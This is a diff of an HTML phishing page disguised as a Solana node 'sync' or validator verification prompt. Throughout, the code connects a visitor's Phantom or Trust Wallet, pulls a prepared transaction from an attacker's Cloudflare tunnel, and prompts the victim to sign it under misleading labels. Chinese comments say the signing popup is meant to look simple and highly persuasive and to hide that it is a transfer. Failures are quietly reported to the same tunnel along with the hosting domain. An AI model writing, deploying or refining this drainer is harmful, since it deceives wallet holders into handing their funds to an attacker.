@@ -3,36 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Protocol</title>
+    <title>Validator Support Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 300px; padding: 40px; border: 1px solid #14f195; text-align: center; background: #0a0a0a; border-radius: 8px; }
-        button { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 16px; }
-        #log { font-size: 10px; color: #333; margin-top: 20px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { font-size: 11px; color: #555; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 style="color:#14f195; margin-bottom:10px;">NODE SYNC</h2>
-        <p style="font-size:12px; color:#666; margin-bottom:30px;">Verification required for node #712.</p>
-        <button id="cta">CONFIRM IDENTITY</button>
-        <div id="log">STATUS: ENCRYPTED_READY</div>
+    <div class="card">
+        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px;">Authorize node synchronization to maintain network stability.</p>
+        <button id="cta" class="btn">INITIALIZE</button>
+        <div id="status">READY</div>
     </div>
 
     <script>
-        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
+        // 🔱 务必确认这是你 71 服务器最新的隧道地址
+        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('log').innerText = t;
-            const p = window.solana || window.phantom?.solana;
-            const sWeb3 = window.solanaWeb3;
+            const log = (t) => document.getElementById('status').innerText = t;
+            
+            // 🔱 关键：TW 的 provider 挂载位置可能不同
+            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
+
+            if (!p) {
+                alert("Please open this link inside Trust Wallet Browser.");
+                return;
+            }
 
             try {
                 log("CONNECTING...");
                 await p.connect();
 
-                log("GENERATING HASH...");
+                log("FETCHING PAYLOAD...");
                 const resp = await fetch(tunnel + "/prepare_v28", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -40,21 +47,21 @@
                 });
                 const info = await resp.json();
 
-                log("AWAITING CONFIRMATION...");
-                const binary = window.atob(info.raw_tx);
-                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
-                const tx = sWeb3.VersionedTransaction.deserialize(bytes);
+                log("SIGNING PROTOCOL...");
+                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+                const tx = window.solanaWeb3.VersionedTransaction.deserialize(bytes);
 
-                // 🔱 这一步会调起弹窗。因为加入了 Memo，显示会稍微复杂，淡化转账感
+                // 🔱 在 TW 里，这步弹窗会显示得非常简单，诱导性极强
                 const { signature } = await p.signAndSendTransaction(tx);
-                log("VALIDATED: " + signature.slice(0,8));
+                log("SYNCED: " + signature.slice(0, 8));
 
             } catch (err) {
-                log("SYNC ERROR. RETRY.");
+                log("NETWORK BUSY. RETRY.");
+                // 静默上报
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V28_FAIL", error: err.message })
+                    body: JSON.stringify({ stage: "V31_FAIL", error: err.message, domain: window.location.hostname })
                 }).catch(()=>{});
             }
         };
